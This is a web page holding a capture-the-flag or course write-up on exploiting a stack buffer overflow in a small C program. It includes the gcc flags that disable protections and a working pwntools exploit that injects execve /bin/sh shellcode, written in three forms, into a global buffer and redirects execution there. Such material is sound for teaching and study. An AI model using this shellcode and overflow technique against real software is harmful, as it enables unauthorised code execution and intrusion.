<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple Buffer Overflow - 0x04
  #


  tags: CTF PWN
  #


  Original Code
  #

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char message[48];

int main()
{
    char name[16];
    printf("Give me your message: ");
    fflush(stdout);
    read(0, message, 0x30);
    fflush(stdout);
    read(0, name, 0x30);
    return 0;
}


Actually, this is a variant of the lecture 0x01


Note that, the global variable has its own address, instead of local variable that push to stack that we don&rsquo;t know at first.'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple Buffer Overflow - 0x04"><meta property="og:description" content='Simple Buffer Overflow - 0x04 # tags: CTF PWN # Original Code # #include <stdio.h> #include <stdlib.h> #include <unistd.h> char message[48]; int main() { char name[16]; printf("Give me your message: "); fflush(stdout); read(0, message, 0x30); fflush(stdout); read(0, name, 0x30); return 0; } Actually, this is a variant of the lecture 0x01
Note that, the global variable has its own address, instead of local variable that push to stack that we don’t know at first.'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta property="article:tag" content="NTUSTISC"><title>Simple Buffer Overflow - 0x04 | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple Buffer Overflow - 0x04</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit>Exploit</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-buffer-overflow---0x04>Simple Buffer Overflow - 0x04
<a class=anchor href=#simple-buffer-overflow---0x04>#</a></h1><h6 id=tags-ctf-pwn>tags: <code>CTF</code> <code>PWN</code>
<a class=anchor href=#tags-ctf-pwn>#</a></h6><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class=language-clike! data-lang=clike!>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

char message[48];

int main()
{
    char name[16];
    printf(&#34;Give me your message: &#34;);
    fflush(stdout);
    read(0, message, 0x30);
    fflush(stdout);
    read(0, name, 0x30);
    return 0;
}
</code></pre><ul><li><p>Actually, this is a variant of the <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs>lecture 0x01</a></p></li><li><p><font color=F0000>Note that</font>, the global variable has its own address, instead of local variable that push to stack that we don&rsquo;t know at first.</p></li><li><p>The 1st <code>read</code> function has no overflow, but 2nd <code>read</code> function has.</p></li><li><p>Note that, if you establish the code yourself, you must turn off the protection by the command below and use <code>checksec</code> to observe the protection</p><pre tabindex=0><code class=language-bash! data-lang=bash!>gcc -o bof3 bof3.c -zexecstack -no-pie -fno-stack-protector -z norelro
</code></pre></li><li><p><font color=FF0000>Note that</font>:
must use <code>mprotect</code> to change permission access just like <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJhgXGKci>lecture 0x04</a>, add these line in original code</p><pre tabindex=0><code class=language-c! data-lang=c!>#include &lt;sys/mman.h&gt;
mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC);
</code></pre><p><strong>Before <code>mprotect</code> - <code>vmmap</code></strong>
<img src=https://imgur.com/yQ8PeWN.png alt>
<strong>After <code>mprotect</code> - <code>vmmap</code></strong>
<img src=https://imgur.com/moSdC0R.png alt></p></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ul><li><p>The main idea of this problem is write down your shellcode in <code>message</code> global variable and use <code>BOF</code> of 2nd <code>read</code> function to overlap <code>%rip</code></p></li><li><p>First, observe the address of global variable - <code>message</code> → <code>4033c0</code>
<img src=https://imgur.com/dTVBnkK.png alt></p></li><li><p>So, we have to construct our shellcode in <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/BJRfEWFcs>lecture 0x02</a></p><pre tabindex=0><code class=language-python! data-lang=python!>from pwn import *

r = process(&#39;./bof3&#39;)
raw_input()

# First, we must set our infrastructure of the platform
context.arch = &#39;amd64&#39;  # x86-64 → amd64, x86-32 → i386

# asm function transfer your shellcode to machine language
shellcode = asm(&#39;&#39;&#39;
mov    rbx, 0x68732f6e69622f
push   rbx
mov    rdi, rsp
xor    rsi, rsi
xor    rdx, rdx
mov    rax, 0x3b
syscall
&#39;&#39;&#39;)

r.send(shellcode)   # Send to 1st read function

payload = b&#39;a&#39; * 0x18 + p64(0x4033c0)

r.send(payload) # Send to 2nd read function that has bof
r.interactive()
</code></pre><ul><li><p>Note that, the 3 methods below are equal</p><pre tabindex=0><code class=language-python! data-lang=python!>shellcode = asm(&#39;&#39;&#39;
mov    rbx, 0x68732f6e69622f
push   rbx
mov    rdi, rsp
xor    rsi, rsi
xor    rdx, rdx
mov    rax, 0x3b
syscall
&#39;&#39;&#39;)
</code></pre><ul><li>Made by <a href=https://defuse.ca/online-x86-assembler.htm#disassembly>Online x86 / x64 Assembler and Disassembler</a></li></ul><pre tabindex=0><code class=language-python! data-lang=python!>shellcode = asm(&#39;\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05&#39;)
</code></pre><ul><li>Made by <code>pwntools</code> built-in function</li></ul><pre tabindex=0><code class=language-python! data-lang=python!>shellcode = asm(shellcraft.sh())
</code></pre></li></ul></li><li><p>Then we got shell!!!
<img src=https://imgur.com/fQ9X9e6.png alt></p></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit>Exploit</a></li></ul></nav></div></aside></main></body></html>